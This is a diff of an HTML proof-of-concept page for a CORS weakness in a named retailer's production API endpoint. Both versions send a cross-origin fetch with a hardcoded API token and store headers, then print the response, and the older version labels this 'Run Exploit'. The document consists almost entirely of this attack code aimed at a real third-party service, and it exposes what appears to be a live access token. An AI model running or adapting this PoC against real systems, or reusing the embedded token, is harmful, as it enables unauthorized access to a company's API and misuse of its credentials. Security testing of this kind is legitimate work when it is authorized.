@@ -1,90 +1,59 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>CORS PoC – Page Components Endpoint</title>
+  <meta charset="UTF-8" />
+  <title>CORS PoC - Carrefour API</title>
   <style>
     body {
-      font-family: monospace;
-      background-color: #fefefe;
-      padding: 2rem;
-      color: #111;
-    }
-    h1 {
-      font-size: 20px;
+      font-family: sans-serif;
+      padding: 20px;
+      background: #f4f4f4;
     }
     button {
+      padding: 10px 20px;
       font-size: 16px;
-      padding: 0.5rem 1rem;
-      margin-bottom: 1rem;
+      margin-bottom: 20px;
       cursor: pointer;
     }
     pre {
-      background: #f4f4f4;
+      background: white;
+      padding: 15px;
       border: 1px solid #ccc;
-      border-radius: 6px;
-      padding: 1rem;
-      white-space: pre-wrap;
+      max-height: 400px;
+      overflow: auto;
     }
   </style>
 </head>
 <body>
-  <h1>CORS PoC: <code>/v1/frame/page-components</code></h1>
-  <button onclick="exploit()">Run Exploit</button>
-  <pre id="output">Click the button to run the exploit.</pre>
+  <h2>📦 Carrefour API CORS Test</h2>
+  <button onclick="fetchData()">Fetch API Data</button>
+  <pre id="output">Click the button to fetch data...</pre>
 
   <script>
-    async function exploit() {
-      const output = document.getElementById("output");
-      output.textContent = "Sending exploit request...\n\n";
+    function fetchData() {
+      document.getElementById("output").textContent = "Loading...";
 
-      const url = "https://api-prod.retailsso.com/v1/frame/page-components?ids=56794";
-
-      const headers = {
-        "Appid": "Reactweb",
-        "Token": "43637022-547D-64D6-8CBE-88457DCDC69F",
-        "Lang": "en",
-        "Env": "prod",
-        "Longitude": "55.3613635",
-        "Latitude": "25.2171003",
-        "Storeid": "mafuae",
-        "Posinfo": "express=003_Zone01,QELEC=003_Zone01,food=072_Zone01,nonfood=099_Zone01"
-      };
-
-      try {
-        const res = await fetch(url, {
-          method: "GET",
-          mode: "cors",
-          // credentials: "include", // Include cookies (if browser allows)
-          headers: headers
-        });
-
-        const responseText = await res.text();
-
-        let headerText = "";
-        res.headers.forEach((value, key) => {
-          headerText += `${key}: ${value}\n`;
-        });
-
-        output.textContent =
-`Request:
-GET ${url}
-
-Request Headers:
-${Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join("\n")}
-
-------------------------
-
-Response Status: ${res.status} ${res.statusText}
-
-Response Headers:
-${headerText}
-
-Response Body:
-${responseText}`;
-      } catch (err) {
-        output.textContent += `\n\n⚠️ Error: ${err.message}`;
-      }
+      fetch("https://api-prod.retailsso.com/v1/frame/page-components?ids=56794", {
+        method: "GET",
+        headers: {
+          "Env": "prod",
+          "Appid": "Reactweb",
+          "Token": "43637022-547D-64D6-8CBE-88457DCDC69F",
+          "Lang": "en",
+          "Longitude": "55.3613635",
+          "Latitude": "25.2171003",
+          "Storeid": "mafuae",
+          "Posinfo": "express=003_Zone01,QELEC=003_Zone01,food=072_Zone01,nonfood=099_Zone01"
+        }
+        // Don't use `credentials: include` unless CORS allows it
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.getElementById("output").textContent = data;
+      })
+      .catch(err => {
+        document.getElementById("output").textContent = "❌ CORS Blocked or Error: " + err;
+      });
     }
   </script>
 </body>
